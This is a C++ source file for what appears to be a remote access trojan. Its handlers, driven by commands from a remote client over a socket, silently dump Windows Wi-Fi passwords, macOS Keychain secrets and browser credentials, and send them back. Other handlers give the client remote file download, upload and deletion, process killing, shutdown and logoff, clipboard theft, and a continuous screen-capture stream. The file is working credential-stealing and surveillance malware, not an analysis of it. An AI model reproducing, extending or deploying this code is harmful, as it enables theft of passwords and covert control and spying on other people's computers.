// Replace previous fetch_windows_wifi_profiles() with this implementation.
static std::string fetch_windows_wifi_profiles() {
    std::ostringstream out;
    out << "=== Windows Wi-Fi Profiles (current user) ===\n\n";

    // 1) Get list of profiles
    FILE* pipe = _popen("netsh wlan show profiles", "r");
    if (!pipe) {
        out << "Failed to run netsh.\n";
        return out.str();
    }

    std::string all;
    char buffer[512];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        all += buffer;
    }
    _pclose(pipe);

    // Parse profile names. Netsh output lines usually look like:
    //    All User Profile     : <SSID_NAME>
    // or
    //    User profile <...> : <SSID_NAME>
    std::regex profile_re(R"((?:All User Profile|User Profile)\s*:\s*(.+))", std::regex::icase);
    std::smatch m;
    std::string::const_iterator searchStart(all.cbegin());
    std::vector<std::string> profiles;

    while (std::regex_search(searchStart, all.cend(), m, profile_re)) {
        std::string ssid = m[1];
        // Trim possible surrounding whitespace
        while (!ssid.empty() && (ssid.front() == ' ' || ssid.front() == '\t' || ssid.front() == '\r' || ssid.front() == '\n'))
            ssid.erase(ssid.begin());
        while (!ssid.empty() && (ssid.back() == ' ' || ssid.back() == '\t' || ssid.back() == '\r' || ssid.back() == '\n'))
            ssid.pop_back();
        if (!ssid.empty()) profiles.push_back(ssid);
        searchStart = m.suffix().first;
    }

    if (profiles.empty()) {
        out << "No Wi-Fi profiles found or netsh output unexpected.\n";
        return out.str();
    }

    out << "Found " << profiles.size() << " profiles:\n\n";

    // 2) For each profile, run netsh show profile key=clear and parse Key Content
    std::regex key_re(R"(Key Content\s*:\s*(.+))", std::regex::icase);
    for (size_t i = 0; i < profiles.size(); ++i) {
        const std::string &ssid = profiles[i];
        out << "Profile " << (i + 1) << ":\n";
        out << "  SSID: " << ssid << "\n";

        // construct command (escape double-quotes inside SSID if any)
        std::string safe_ssid = ssid;
        size_t pos = 0;
        while ((pos = safe_ssid.find('"', pos)) != std::string::npos) {
            safe_ssid.replace(pos, 1, "\\\""); // basic escaping
            pos += 2;
        }

        std::string cmd = "netsh wlan show profile name=\"" + safe_ssid + "\" key=clear";
        FILE* pipe2 = _popen(cmd.c_str(), "r");
        if (!pipe2) {
            out << "  Error: failed to run netsh for this profile.\n\n";
            continue;
        }

        std::string prof_out;
        while (fgets(buffer, sizeof(buffer), pipe2)) {
            prof_out += buffer;
        }
        _pclose(pipe2);

        // Search for Key Content
        std::smatch km;
        if (std::regex_search(prof_out, km, key_re)) {
            std::string key = km[1];
            // trim key
            while (!key.empty() && isspace((unsigned char)key.front())) key.erase(key.begin());
            while (!key.empty() && isspace((unsigned char)key.back())) key.pop_back();
            out << "  Key : " << key << "\n\n";
        } else {
            out << "  Key : (not shown / profile may be open or keys not available)\n\n";
        }
    }

    return out.str();
}
#endif


#else // macOS

static std::string cfstring_to_std(CFStringRef s) {
    if (!s) return std::string();
    CFIndex len = CFStringGetLength(s);
    CFIndex maxSize = CFStringGetMaximumSizeForEncoding(len, kCFStringEncodingUTF8) + 1;
    std::vector<char> buf(maxSize);
    if (CFStringGetCString(s, buf.data(), maxSize, kCFStringEncodingUTF8)) {
        return std::string(buf.data());
    }
    return std::string();
}

static std::string fetch_macos_keychain_generic_and_internet(bool include_secret) {
    std::ostringstream out;
    out << "=== macOS Keychain (login) ===\n\n";

    // Prepare query dictionary for generic passwords and internet passwords
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks
    );

    CFDictionaryAddValue(query, kSecClass, kSecClassGenericPassword);
    CFDictionaryAddValue(query, kSecMatchLimit, kSecMatchLimitAll);
    CFDictionaryAddValue(query, kSecReturnAttributes, kCFBooleanTrue);
    if (include_secret) CFDictionaryAddValue(query, kSecReturnData, kCFBooleanTrue);

    CFTypeRef result = nullptr;
    OSStatus status = SecItemCopyMatching(query, &result);
    if (status == errSecSuccess && result) {
        CFArrayRef arr = (CFArrayRef)result;
        CFIndex n = CFArrayGetCount(arr);
        out << "Found " << n << " generic password items.\n\n";
        for (CFIndex i = 0; i < n; ++i) {
            CFDictionaryRef item = (CFDictionaryRef)CFArrayGetValueAtIndex(arr, i);
            CFStringRef service = (CFStringRef)CFDictionaryGetValue(item, kSecAttrService);
            CFStringRef account = (CFStringRef)CFDictionaryGetValue(item, kSecAttrAccount);
            out << "Service: " << cfstring_to_std(service) << "\n";
            out << "Account: " << cfstring_to_std(account) << "\n";
            if (include_secret) {
                CFDataRef data = (CFDataRef)CFDictionaryGetValue(item, kSecValueData);
                if (data) {
                    const UInt8* bytes = CFDataGetBytePtr(data);
                    CFIndex dlen = CFDataGetLength(data);
                    std::string s((const char*)bytes, dlen);
                    out << "Secret: " << s << "\n";
                } else {
                    out << "Secret: (none)\n";
                }
            }
            out << "---\n";
        }
        CFRelease(result);
    } else {
        out << "SecItemCopyMatching (generic) returned: " << status << "\n";
    }
    CFRelease(query);

    // Now internet passwords
    query = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks
    );
    CFDictionaryAddValue(query, kSecClass, kSecClassInternetPassword);
    CFDictionaryAddValue(query, kSecMatchLimit, kSecMatchLimitAll);
    CFDictionaryAddValue(query, kSecReturnAttributes, kCFBooleanTrue);
    if (include_secret) CFDictionaryAddValue(query, kSecReturnData, kCFBooleanTrue);

    result = nullptr;
    status = SecItemCopyMatching(query, &result);
    if (status == errSecSuccess && result) {
        CFArrayRef arr = (CFArrayRef)result;
        CFIndex n = CFArrayGetCount(arr);
        out << "Found " << n << " internet password items.\n\n";
        for (CFIndex i = 0; i < n; ++i) {
            CFDictionaryRef item = (CFDictionaryRef)CFArrayGetValueAtIndex(arr, i);
            CFStringRef server = (CFStringRef)CFDictionaryGetValue(item, kSecAttrServer);
            CFStringRef account = (CFStringRef)CFDictionaryGetValue(item, kSecAttrAccount);
            out << "Server: " << cfstring_to_std(server) << "\n";
            out << "Account: " << cfstring_to_std(account) << "\n";
            if (include_secret) {
                CFDataRef data = (CFDataRef)CFDictionaryGetValue(item, kSecValueData);
                if (data) {
                    const UInt8* bytes = CFDataGetBytePtr(data);
                    CFIndex dlen = CFDataGetLength(data);
                    std::string s((const char*)bytes, dlen);
                    out << "Secret: " << s << "\n";
                } else {
                    out << "Secret: (none)\n";
                }
            }
            out << "---\n";
        }
        CFRelease(result);
    } else {
        out << "SecItemCopyMatching (internet) returned: " << status << "\n";
    }
    CFRelease(query);

    return out.str();
}

static std::string fetch_macos_wifi() {
    // On macOS you normally use `security` CLI to access some Wi-Fi entries or query the System keychain.
    // We'll call `security` to list airport preferences (requires appropriate permission).
    std::ostringstream out;
    out << "=== macOS Wi-Fi (use `networksetup` & `security`) ===\n\n";
    out << "To list hardware ports:\n  /usr/sbin/networksetup -listallhardwareports\n";
    out << "To see stored Wi-Fi network keys (requires permission):\n";
    out << "  security find-generic-password -D \"AirPort network password\" -ga \"SSID_NAME\"\n";
    return out.str();
}

#endif // platform-specific


// Top-level handler used by your existing agent
// Top-level handler used by your existing agent
std::string handle_credential_cmd(const std::string &cmd) {
    if (cmd == "CRED_MANAGER" || cmd == "VAULT") {
            #if defined(_WIN32) || defined(_WIN64)
                    // Fetch only credentials current user can access silently
                    return fetch_windows_credential_manager();
            #else
                    return fetch_macos_keychain_generic_and_internet(true);
            #endif
    } else if (cmd == "BROWSER_CREDS") {
          return browser_credentials_report();
    } else if (cmd == "WIFI_CREDS") {
        #if defined(_WIN32) || defined(_WIN64)
                return fetch_windows_wifi_profiles();
        #else
                return fetch_macos_wifi();
        #endif
    } else if (cmd == "SYSTEM_CREDS") {
        #if defined(_WIN32) || defined(_WIN64)
                return "SYSTEM credentials require SYSTEM privileges and are not enumerated here.\n";
        #else
                return "System keychains live under /Library/Keychains/ and require elevated privileges.\n";
        #endif
    } else if (cmd == "SUMMARY") {
            std::ostringstream out;
            out << "SUMMARY: This command returns credentials accessible to the current user.\n";
            out << "Secrets are retrieved silently using OS APIs and decrypted with current user keys.\n";
            return out.str();
    } else {
            return std::string("Unknown command: ") + cmd + "\n";
    }
}

// Start credential manager: fetch and send result to client
void start_credential_manager(sock_t sock, const json& payload, const std::string& client) {
    std::string cmd = payload.value("cmd", "");
    std::string result;

    
        result = handle_credential_cmd(cmd);
    

    // Send result back to client
    send_result(sock, payload, client, result, false);
}

void open_file_manager(sock_t sock, const json& payload, const std::string& client) {
    namespace fs = std::filesystem;
    std::string cmd = payload.value("cmd", "");
    std::string path = payload.value("path", fs::current_path().string());
    printf("File Manager command: %s on path: %s\n", cmd.c_str(), path.c_str());
    size_t offset = payload.value("offset", 0);
    size_t size = payload.value("size", 512 * 1024); // 512KB chunks

    
        if (cmd == "list_files") {
            json response;
            response["path"] = path;  // ✅ include path for clarity
            response["files"] = json::array();
            std::cout << "[DEBUG] Listing path: " << path << std::endl;

           
                for (const auto& entry : fs::directory_iterator(path)) {
                    json item;
                    item["name"] = entry.path().filename().string();
                    item["is_dir"] = entry.is_directory();
                    response["files"].push_back(item);
                }
            

            json wrapper;
            wrapper["results"] = {response};
            send_result(sock, payload, client, wrapper.dump());
            return;
        }

        else if (cmd == "download_file") {
            printf("Downloading file: %s (offset: %zu, size: %zu)\n", path.c_str(), offset, size);

            namespace fs = std::filesystem;

            // ✅ 1. If it's a directory, compress it first
            if (fs::is_directory(path)) {
                std::string zipPath;
                std::string cmdLine;

        #ifdef _WIN32
                // --- Detect if running under Wine ---
                bool underWine = (std::getenv("WINELOADERNOEXEC") != nullptr);

                if (underWine) {
                    // 🔄 Wine fallback: use Linux zip command
                    zipPath = "/tmp/temp.zip";
                    cmdLine = "zip -r -q " + zipPath + " " + path;
                } else {
                    // ✅ True Windows system
                    zipPath = "C:\\Windows\\Temp\\temp.zip";
                    cmdLine = "powershell -Command \"Compress-Archive -Path '" + path + "' -DestinationPath '" + zipPath + "' -Force\"";
                }
        #else
                // ✅ Linux or macOS
                zipPath = "/tmp/temp.zip";
                cmdLine = "zip -r -q " + zipPath + " " + path;
        #endif

                printf("Zipping directory before download: %s\n", cmdLine.c_str());
                int zipResult = system(cmdLine.c_str());
                if (zipResult != 0) {
                    json err = {{"results", {{{"error", "Failed to zip directory: " + path}}}}};
                    send_result(sock, payload, client, err.dump());
                    return;
                }

                path = zipPath; // Replace with zipped path
            }

            // ✅ 2. Proceed with file streaming
            std::ifstream file(path, std::ios::binary);
            if (!file.is_open()) {
                json err = {{"results", {{{"error", "Cannot open file: " + path}}}}};
                send_result(sock, payload, client, err.dump());
                return;
            }

            file.seekg(0, std::ios::end);
            size_t total_size = static_cast<size_t>(file.tellg());
            if (offset >= total_size) {
                json res = {
                    {"results", {{
                        {"data", ""},
                        {"done", true},
                        {"total_size", total_size}
                    }}}
                };
                send_result(sock, payload, client, res.dump());
                return;
            }

            file.seekg(offset, std::ios::beg);
            size_t to_read = std::min(size, total_size - offset);
            std::vector<char> buffer(to_read);
            file.read(buffer.data(), to_read);

            std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(buffer.data()), buffer.size());
            json res = {
                {"results", {{
                    {"data", encoded},
                    {"done", offset + buffer.size() >= total_size},
                    {"total_size", total_size},
                    {"offset", offset}
                }}}
            };
            send_result(sock, payload, client, res.dump());
            return;
        }


        else if (cmd == "upload_file") {
            std::string b64 = payload.value("data", std::string(""));
            size_t off = payload.value("offset", 0u);
            std::string decoded = base64_decode_to_string(b64);

            fs::path p(path);
            fs::create_directories(p.parent_path());

            std::fstream out;
            out.open(path, std::ios::in | std::ios::out | std::ios::binary);
            if (!out.is_open()) {
                out.open(path, std::ios::out | std::ios::binary);
                out.close();
                out.open(path, std::ios::in | std::ios::out | std::ios::binary);
            }
            out.seekp(off);
            out.write(decoded.data(), static_cast<std::streamsize>(decoded.size()));
            out.flush();
            out.close();

            json res = { {"success", true}, {"written", decoded.size()}, {"offset", off} };
            send_result(sock, payload, client, res.dump());
            return;
        }

        else if (cmd == "delete_file") {
            fs::remove_all(path);
            json res = { {"success", true} };
            send_result(sock, payload, client, res.dump());
            return;
        }

        else if (cmd == "rename_file") {
            std::string new_path = payload.value("new_path", "");
            fs::rename(path, new_path);
            json res = { {"success", true} };
            send_result(sock, payload, client, res.dump());
            return;
        }

        else {
            json res = { {"error", "Unknown command: " + cmd} };
            send_result(sock, payload, client, res.dump());
            return;
        }
   
}



void open_process_manager(sock_t sock, const json& payload, const std::string& client) {
    const std::string cmd = payload.value("cmd", "");
    int pid = std::stoi(payload.value("pid", "0"));  // convert to int

    if (cmd == "kill_process" && pid > 0) {
#ifdef _WIN32
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess == NULL) {
            send_result(sock, payload, client, "Failed to open process with PID " + std::to_string(pid) + "\n", false);
            return;
        }
        if (TerminateProcess(hProcess, 1)) {
            send_result(sock, payload, client, "Process " + std::to_string(pid) + " killed successfully\n", false);
        } else {
            send_result(sock, payload, client, "Failed to terminate process " + std::to_string(pid) + "\n", false);
        }
        CloseHandle(hProcess);
#else
        if (kill(pid, SIGKILL) == 0) {
            send_result(sock, payload, client, "Process " + std::to_string(pid) + " killed successfully\n", false);
        } else {
            send_result(sock, payload, client, "Failed to kill process " + std::to_string(pid) + "\n", false);
        }
#endif
    }
else if (cmd == "list_process") {
#ifdef _WIN32
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        send_result(sock, payload, client, "Failed to get process snapshot\n", false);
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    json processList = json::array();

    if (Process32First(hSnap, &pe32)) {
        do {
            processList.push_back({
                {"pid",  static_cast<int>(pe32.th32ProcessID)},
                {"name", std::string(pe32.szExeFile)}
            });
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);

    send_result(sock, payload, client, processList.dump(), false);
#else
    json processList = json::array();
    FILE* pipe = popen("ps -e -o pid=,comm=", "r");
    if (!pipe) {
        send_result(sock, payload, client, "Failed to run ps\n", false);
    } else {
        char buf[256];
        while (fgets(buf, sizeof(buf), pipe)) {
            int pid;
            char name[128];
            if (sscanf(buf, "%d %127s", &pid, name) == 2) {
                processList.push_back({{"pid", pid}, {"name", std::string(name)}});
            }
        }
        pclose(pipe);
        send_result(sock, payload, client, processList.dump(), false);
    }
#endif
}

}

void send_system_info(sock_t sock,  const json& payload, const std::string& client) {
    send_result(sock,  payload, client, get_system_info_json().dump(), false);
}

// void start_chat(sock_t sock, const json& payload, const std::string& client) {
//     chat_interface(sock, client, payload);
// }

void handle_power_control(sock_t sock, const json& payload, const std::string& client) {
    std::string cmd = payload.value("cmd", "");
    std::string result;

    if (cmd == "restart") {
       #if defined(_WIN32) || defined(_WIN64)
        system("shutdown /r /t 0");
       #else
        system("reboot");
       #endif
        result = "Power control: restart issued\n";
    }
    else if (cmd == "shutdown") {
        #if defined(_WIN32) || defined(_WIN64)
                system("shutdown /s /t 0");
        #else
                system("shutdown now");
        #endif
            result = "Power control: shutdown issued\n";
    }
    else if (cmd == "sleep") {
        #if defined(_WIN32) || defined(_WIN64)
                SetSuspendState(FALSE, TRUE, TRUE);
        #else
                system("systemctl suspend");
        #endif
           result = "Power control: sleep issued\n";
    }
    else if (cmd == "logoff") {
        #if defined(_WIN32) || defined(_WIN64)
                ExitWindowsEx(EWX_LOGOFF, 0);
        #else
                system("gnome-session-quit --logout --no-prompt");
        #endif
                result = "Power control: logoff issued\n";
    }
    else {
        result = "Unknown power command: " + cmd + "\n";
    }

    // ✅ Send result back so your PyQt GUI can display it
    send_result(sock, payload, client, result, false);
}

void sync_clipboard(sock_t sock, const json& payload, const std::string& client) {
    const std::string cmd = payload.value("cmd", "");
    const std::string remote_text = payload.value("remote_text", "");

    if (cmd == "set_remote_text") {
        std::string text = remote_text;

        // 🧩 Receive full text if empty (raw data mode)
        if (text.empty()) {
            uint32_t len_net = 0;
            if (!recv_all(sock, reinterpret_cast<char*>(&len_net), sizeof(len_net))) return;
            uint32_t len = ntohl(len_net);
            if (len == 0) return;
            text.resize(len);
            if (!recv_all(sock, &text[0], len)) return;
        }

        // ✅ Safely set clipboard
        set_clipboard_text(text);
        send_result(sock, payload, client, R"({"status":"CLIPBOARD_OK"})", false);
    }
    else if (cmd == "get_remote_text") {
        std::string text = get_clipboard_text();

        if (text.empty()) {
            send_result(sock, payload, client, R"({"status":"CLIPBOARD_EMPTY","text":""})", false);
        } else {
            // ✅ Sanitize text for JSON safety
            std::string safe_text;
            safe_text.reserve(text.size());
            for (unsigned char c : text) {
                if (c == '\n' || c == '\r' || c == '\t' || (c >= 0x20 && c <= 0x7E) || (c >= 0xA0))
                    safe_text += c;
                else
                    safe_text += '?'; // replace invalid char
            }

            // ✅ Always send valid JSON
            json response = {
                {"status", "CLIPBOARD_OK"},
                {"text", safe_text}
            };
            send_result(sock, payload, client, response.dump(), false);
        }
    }
    else {
        send_result(sock, payload, client, R"({"status":"CLIPBOARD_UNKNOWN_CMD"})", false);
    }
}





void manage_sessions(sock_t sock, const json& payload, const std::string& client) {
    std::ostringstream out;
    json response_json;
    response_json["sessions"] = json::array();

    std::string cmd = payload.value("cmd", "");
    int target_id = payload.value("session_id", -1);

#ifdef _WIN32
    if (cmd == "kill_session" && target_id >= 0) {
        BOOL ok = WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, target_id, FALSE);
        if (ok) {
            response_json = {{"status", "killed"}, {"session_id", target_id}};
            out << "✅ Session " << target_id << " killed successfully\n";
        } else {
            DWORD err = GetLastError();
            response_json = {{"status", "failed"}, {"error", err}, {"session_id", target_id}};
            out << "❌ Failed to kill session " << target_id << " (Error " << err << ")\n";
        }

        send_result(sock, payload, client, response_json.dump(), false);
        // send_result(sock, payload, client, out.str(), false);
        return;
    }

    // --- Normal list_sessions path ---
    PWTS_SESSION_INFO pSessionInfo = nullptr;
    DWORD count = 0;
    if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &count)) {
        out << "Active sessions (" << count << "):\n";
        for (DWORD i = 0; i < count; i++) {
            WTS_SESSION_INFO si = pSessionInfo[i];
            std::string state;
            switch (si.State) {
                case WTSActive: state = "Active"; break;
                case WTSDisconnected: state = "Disconnected"; break;
                case WTSIdle: state = "Idle"; break;
                default: state = "Other"; break;
            }

            out << "SessionID: " << si.SessionId
                << " | State: " << state
                << " | StationName: " << (si.pWinStationName ? si.pWinStationName : "")
                << "\n";

            response_json["sessions"].push_back({
                {"session_id", si.SessionId},
                {"state", state},
                {"station", si.pWinStationName ? si.pWinStationName : ""}
            });
        }
        WTSFreeMemory(pSessionInfo);
    } else {
        out << "Failed to enumerate sessions (Win32 error " << GetLastError() << ")\n";
    }
#else
    // Unix: for now just list, no kill implemented
    FILE* pipe = popen("who", "r");
    if (!pipe) {
        out << "Failed to run who\n";
    } else {
        char buf[256];
        out << "Active sessions:\n";
        while (fgets(buf, sizeof(buf), pipe)) {
            std::string line(buf);
            out << line;

            std::istringstream iss(line);
            std::string user, tty;
            if (iss >> user >> tty) {
                response_json["sessions"].push_back({
                    {"user", user},
                    {"tty", tty},
                    {"raw", line}
                });
            }
        }
        pclose(pipe);
    }
#endif

    send_result(sock, payload, client, response_json.dump(), false);
    // send_result(sock, payload, client, out.str(), false);
}



std::vector<unsigned char> base64_decode_bytes(const std::string& str);
// --- Base64 encode/decode helper (can plug any library here) ---
std::string base64_encode(const std::vector<unsigned char>& data);



// --- File Transfer (chunked + resumable) ---







    // --- Helper: Save HBITMAP to JPEG in memory (Windows) ---
#ifdef _WIN32
std::vector<BYTE> hbitmap_to_jpeg(HBITMAP hBitmap, int quality = 75) {
    std::vector<BYTE> buffer;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;
GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    Gdiplus::Bitmap bmp(hBitmap, NULL);

    // Setup encoder
    CLSID clsidEncoder;
    UINT numEncoders = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&numEncoders, &size);
    if (size == 0) return buffer;

    std::vector<BYTE> encoders(size);
    Gdiplus::ImageCodecInfo* pImageCodecInfo = reinterpret_cast<Gdiplus::ImageCodecInfo*>(encoders.data());
    Gdiplus::GetImageEncoders(numEncoders, size, pImageCodecInfo);

    for (UINT j = 0; j < numEncoders; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, L"image/jpeg") == 0) {
            clsidEncoder = pImageCodecInfo[j].Clsid;
            break;
        }
    }

    // Save to IStream in memory
    IStream* pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);

    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Value = &quality;

    bmp.Save(pStream, &clsidEncoder, &encoderParams);

    // Copy data from stream
    STATSTG statstg;
    pStream->Stat(&statstg, STATFLAG_DEFAULT);
    ULONG sizeData = (ULONG)statstg.cbSize.QuadPart;
    buffer.resize(sizeData);

    LARGE_INTEGER liZero = {};
    pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
    ULONG bytesRead = 0;
    pStream->Read(buffer.data(), sizeData, &bytesRead);

    pStream->Release();
    return buffer;
}

// Capture full screen using GDI
HBITMAP capture_screen_hbitmap() {
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);

    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    return hBitmap;
}
#endif
    
    

void start_recording(sock_t sock, const json& payload, const std::string& client) {
    if (recording_active) {
        send_result(sock, payload, client, R"({"error":"Recording already running"})", false);
        return;
    }

    recording_active = true;

    recording_thread = std::thread([sock, payload, client]() {
        while (recording_active) {
#ifdef _WIN32
            HBITMAP hBmp = capture_screen_hbitmap();
            auto jpeg = hbitmap_to_jpeg(hBmp, 70);
            DeleteObject(hBmp);
#else
            std::vector<unsigned char> jpeg = capture_screen_jpeg(70);
#endif
            if (!jpeg.empty()) {
                std::string encoded = base64_encode(jpeg);
                json resp;
                resp["frame"] = encoded;
                send_result(sock, payload, client, resp.dump(), false);
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
    });

    recording_thread.detach();
    send_result(sock, payload, client, R"({"status":"Recording started"})", false);
}

void stop_recording(sock_t sock, const json& payload, const std::string& client) {
    if (!recording_active) {
        send_result(sock, payload, client, R"({"error":"No active recording"})", false);
        return;
    }

    recording_active = false;
    send_result(sock, payload, client, R"({"status":"Recording stopped"})", false);
}
void show_help(sock_t sock, const json& payload, const std::string& client) {
        send_result(sock,  payload, client, "Help: see documentation or contact admin.\n", false);
        display_help();
    }

    // Utility: split string by space
    static std::vector<std::string> split(const std::string& s) {
        std::vector<std::string> tokens;
        std::string token;
        for (char c : s) {
            if (isspace(c)) {
                if (!token.empty()) {
                    tokens.push_back(token);
                    token.clear();
                }
            } else token.push_back(c);
        }
        if (!token.empty()) tokens.push_back(token);
        return tokens;
    }

